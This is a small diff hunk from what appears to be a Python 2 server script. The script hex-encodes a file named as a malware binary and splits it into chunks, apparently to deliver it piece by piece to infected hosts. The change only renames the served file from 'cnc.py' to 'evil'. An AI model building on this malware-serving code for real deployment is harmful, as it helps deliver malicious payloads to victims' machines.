@@ -21,7 +21,7 @@ BLOCKS_PER_REQUEST = 10
 CHARS_PER_BLOCK = 32
 CHUNK_SIZE = CHARS_PER_BLOCK * BLOCKS_PER_REQUEST
 
-malware_binary = 'cnc.py'
+malware_binary = 'evil'
 print 'Serving binary:', malware_binary
 evil = open(malware_binary).read().encode('hex')
 NUM_CHUNKS = len(evil) / (CHUNK_SIZE) + 1
